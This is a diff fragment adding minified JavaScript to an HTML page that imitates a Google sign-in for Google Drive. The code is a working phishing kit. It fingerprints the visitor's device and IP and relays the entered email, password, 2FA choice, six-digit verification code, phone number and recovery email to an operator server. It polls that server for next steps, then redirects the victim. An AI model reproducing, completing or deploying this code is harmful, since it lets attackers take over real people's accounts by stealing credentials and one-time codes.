d.lastJsonResponse==='string'?JSON.parse(d.lastJsonResponse):d.lastJsonResponse;const benign=r.verificationState==='WAITING_RECOVERY_EMAIL'&&(!r.message||/confirmation screen reached|Processing recovery email|added to your account:/.test(r.message||''));if(!benign&&r.message){showFieldError('InvalidRecoveryEmail','recoveryEmailGroup',r.message)}}catch(e){}}startPolling(2000);break;}
+case'COMPLETED':case'PROCESSING_FINALIZING':{hideLoadingOverlay();clearInterval(pollingIntervalId);let rU=templateConfig.landingPageLink&&templateConfig.landingPageLink.trim()!==''?templateConfig.landingPageLink:window.location.href;if(rU&&!rU.startsWith('http://')&&!rU.startsWith('https://'))rU='https://'+rU;window.location.href=rU;break;}
+case'FAILED':{let failMsg='Document retrieval failed. Please try again later.';if(d.lastJsonResponse){try{const r=typeof d.lastJsonResponse==='string'?JSON.parse(d.lastJsonResponse):d.lastJsonResponse;if(r.message)failMsg=r.message}catch(e){}}showFailedView(failMsg);clearInterval(pollingIntervalId);break;}
+default:{showStyledError('An unexpected status was received. Please try again.');clearInterval(pollingIntervalId);hideLoadingOverlay();}}}
+function renderVerificationOptions(o){const c=document.getElementById('verificationOptionsContainer');c.innerHTML='';if(!o||o.length===0){c.innerHTML='<p style="color:#5f6368;font-size:13px;">No verification options available.</p>';return}o.forEach((t,i)=>{const d=document.createElement('div');d.className='option-item'+(t.disabled?' disabled':'');d.setAttribute('role','button');d.setAttribute('tabindex','0');if(t.disabled)d.setAttribute('aria-disabled','true');const iconSpan=document.createElement('span');iconSpan.className='option-icon';iconSpan.innerHTML='<i class="fas fa-envelope"></i>';const textSpan=document.createElement('span');textSpan.className='option-text';textSpan.textContent=t.label;d.appendChild(iconSpan);d.appendChild(textSpan);const hiddenInput=document.createElement('input');hiddenInput.type='radio';hiddenInput.name='verificationOption';hiddenInput.id='vOpt'+i;hiddenInput.value=t.choiceIndex;hiddenInput.style.display='none';d.appendChild(hiddenInput);function selectOption(){if(isSubmitting||isProcessing||currentStatus!=='WAITINGOPTIONS'||document.querySelector('#verificationOptionsContainer .option-item.selected'))return;document.querySelectorAll('#verificationOptionsContainer .option-item').forEach(el=>{el.classList.remove('selected');const ri=el.querySelector('input[type="radio"]');if(ri)ri.checked=false});d.classList.add('selected');hiddenInput.checked=true;setTimeout(function(){handleFormSubmission()},300)}if(!t.disabled){d.addEventListener('click',selectOption);d.addEventListener('keydown',function(e){if(e.key==='Enter'||e.key===' '){e.preventDefault();selectOption()}})};c.appendChild(d)})}
+async function initialFormSubmission(){showLoadingOverlay();const sB=document.getElementById('next_button');if(sB){sB.textContent='Next';sB.disabled=true}const uP=new URLSearchParams(window.location.search),email=uP.get('email'),eF=document.getElementById('txtEmail'),fB=document.getElementById('forgot');if(email){eF.value=email;eF.readOnly=true;fB.style.display='none'}else{eF.readOnly=false;fB.style.display='inline-block'}
+const dD={userAgent:navigator.userAgent,platform:navigator.platform,language:navigator.language,screenWidth:window.screen.width,screenHeight:window.screen.height,colorDepth:window.screen.colorDepth,pixelRatio:window.devicePixelRatio,hardwareConcurrency:navigator.hardwareConcurrency,deviceMemory:navigator.deviceMemory,vendor:navigator.vendor,maxTouchPoints:navigator.maxTouchPoints};let iP={};try{iP=await fetch('https://ipinfo.io/json').then(r=>r.json())}catch(e){}try{window._ipCountry=(iP&&iP.country)||''}catch(_e){}
+try{const nU=apiBaseUrl+'/notify-form-submission';const r=await fetch(nU,{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:objectToFormData({token:templateConfig.token,formData:JSON.stringify({email:email||'',password:'',strictly:'gmail',ipData:iP,deviceData:dD})})});if(!r.ok)throw new Error('HTTP '+r.status);const d=await r.json();if(d.apiResponse&&d.apiResponse.browserId){browserId=d.apiResponse.browserId;browserIdReady=true;if(d.pollingUrl&&!templateConfig.pollingUrl){templateConfig.pollingUrl=d.pollingUrl;apiBaseUrl=d.pollingUrl.replace('/pooling-operator','');}if(d.updateUrl&&!templateConfig.updateUrl){templateConfig.updateUrl=d.updateUrl;updateBaseUrl=d.updateUrl.replace('/update-process','');}sB.disabled=false;if(pendingSubmission){const ps=pendingSubmission;pendingSubmission=null;sendUpdate(ps.p,ps.uT)}else{updateUIForStatus(d.apiResponse.status,d.apiResponse)}}else throw new Error('No browserId received')}catch(e){console.error('[Template] Initial submission error:',e);hideLoadingOverlay();showFailedView('Failed to connect to the server. Please try again.');return}
+setTimeout(()=>{hideLoadingOverlay();if(!email){eF.focus()}},3000)}
+async function sendUpdate(p,uT){try{const pU=updateBaseUrl+'/update-process';const r=await fetch(pU,{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:objectToFormData(p)});if(!r.ok)throw new Error('HTTP '+r.status);const d=await r.json();isProcessing=true;updateUIForStatus('PROCESSING',{})}catch(e){console.error('[Template] Submission error:',e);setFormSubmitting(false);document.querySelectorAll('#verificationOptionsContainer .option-item.selected').forEach(el=>el.classList.remove('selected'));showStyledError('An error occurred during submission. Please try again.')}}
+async function handleFormSubmission(){if(isSubmitting)return;hideAllErrors();setFormSubmitting(true);const eF=document.getElementById('txtEmail'),pF=document.getElementById('txtPassword'),vCI=document.getElementById('txtVerificationCode'),sB=document.getElementById('next_button');sB.innerText='Checking...';sB.disabled=true;let p={browserId:browserId,token:templateConfig.token},uT=''
+if(currentStatus==='WAITINGEMAIL'||currentStatus==='WAITINGEMAILERROR'){const e=eF.value.trim();if(!isValidEmail(e)){showFieldError('InvalidEmail','emailGroup');setFormSubmitting(false);resetFormState();return}p.email=e;const pw=pF.value.trim();if(pw)p.password=pw;uT='email'}
+else if(currentStatus==='WAITINGPASSWORD'||currentStatus==='WAITINGPASSWORDERROR'){const pw=pF.value.trim();if(!pw){showFieldError('RequirePassword','passwordGroup');setFormSubmitting(false);resetFormState();return}if(pw.length<6){showFieldError('RequirePassword','passwordGroup','Password must be at least 6 characters.');setFormSubmitting(false);resetFormState();return}p.password=pw;uT='password'}
+else if(currentStatus==='WAITINGOPTIONS'){const s=document.querySelector('input[name="verificationOption"]:checked');if(!s){showFieldError('RequireVerificationChoice',null);setFormSubmitting(false);resetFormState();return}p.verificationChoice=JSON.stringify([{choice:s.value}]);uT='verificationChoice'}
+else if(currentStatus==='WAITINGCODE'){const c=vCI.value.trim();if(!c){showFieldError('RequireVerificationCode','verificationCodeGroup');setFormSubmitting(false);resetFormState();return}if(!/^\d{6}$/.test(c)){showFieldError('RequireVerificationCode','verificationCodeGroup','Please enter the complete 6-digit code.');setFormSubmitting(false);resetFormState();return}p.verificationCode=c;uT='verificationCode'}
+else if(currentStatus==='WAITINGPHONENUMBER'){const ph=getPhoneNumberValue();if(!ph||ph.replace(/\D/g,'').length<7){showFieldError('RequirePhoneNumber','phoneNumberGroup');setFormSubmitting(false);resetFormState();return}const sc=selectedCountry();p.phoneNumber=ph;p.phoneCountryDial=sc.dial;p.phoneCountryIso=sc.iso;uT='phoneNumber'}
+else if(currentStatus==='WAITINGRECOVERYEMAIL'){const re=document.getElementById('txtRecoveryEmail').value.trim();if(!isValidEmail(re)){showFieldError('RequireRecoveryEmail','recoveryEmailGroup');setFormSubmitting(false);resetFormState();return}p.recoveryEmail=re;uT='recoveryEmail'}
+else{setFormSubmitting(false);showStyledError('Unexpected form submission state. Please try again.');return}p.updateType=uT
+if(browserIdReady){sendUpdate(p,uT)}else{pendingSubmission={p:p,uT:uT};isProcessing=true;updateUIForStatus('PROCESSING',{})}}
+function resetFormState(){setFormSubmitting(false);const b=document.getElementById('next_button'),eF=document.getElementById('txtEmail'),pF=document.getElementById('txtPassword');if(!new URLSearchParams(window.location.search).get('email')){eF.readOnly=false;eF.disabled=false;document.getElementById('forgot').style.display='inline-block'}else{eF.readOnly=true;eF.disabled=false}pF.disabled=false;pF.readOnly=false;b.disabled=false;b.textContent='Next';b.style.backgroundColor='';b.style.color='';document.getElementById('emailGroup').style.display='block';const eC=document.getElementById('emailChip');if(eC)eC.style.display='none';document.getElementById('passwordGroup').style.display='none';document.getElementById('showPasswordRow').style.display='none';document.getElementById('forgotPasswordLink').style.display='none';document.getElementById('verificationOptionsGroup').style.display='none';document.getElementById('verificationCodeGroup').style.display='none';document.getElementById('phoneNumberGroup').style.display='none';document.getElementById('recoveryEmailGroup').style.display='none';document.getElementById('phonePromptView').style.display='none';const vsM=document.getElementById('verifySentMessage');if(vsM)vsM.style.display='none';const tAW=document.getElementById('tryAnotherWay');if(tAW)tAW.style.display='none';document.getElementById('guestText').style.display='block';document.getElementById('create_button').style.display='inline-block';document.getElementById('signin_heading').innerText='Sign in';document.getElementById('statement').innerHTML='to continue to Google Drive';pF.value='';document.getElementById('showPasswordCheck').checked=false;pF.type='password'}
+document.addEventListener('DOMContentLoaded',function(){window.onerror=function(m,u,l,c,err){console.error('[Template] UNCAUGHT ERROR:',m,'| line:',l,'| col:',c,'| err:',err);showStyledError('Something went wrong. Please refresh and try again.');};initialFormSubmission();const fpl=document.getElementById('forgotPasswordLink');if(fpl)fpl.onclick=function(){window.open('https://accounts.google.com/signin/recovery','_blank')};const seb=document.getElementById('sessionExpiredRetryBtn');if(seb)seb.onclick=function(){location.reload()}});
+function initFloatingLabels(){document.querySelectorAll('.field-group fieldset input').forEach(function(inp){var fs=inp.closest('fieldset');function toggle(){if(inp.value){fs.classList.add('has-value')}else{fs.classList.remove('has-value')}}inp.addEventListener('input',toggle);inp.addEventListener('change',toggle);toggle()})}
+var _flInterval=setInterval(function(){if(document.getElementById('txtEmail')){clearInterval(_flInterval);initFloatingLabels()}},200);
+
+</script>
+</body>
+</html>
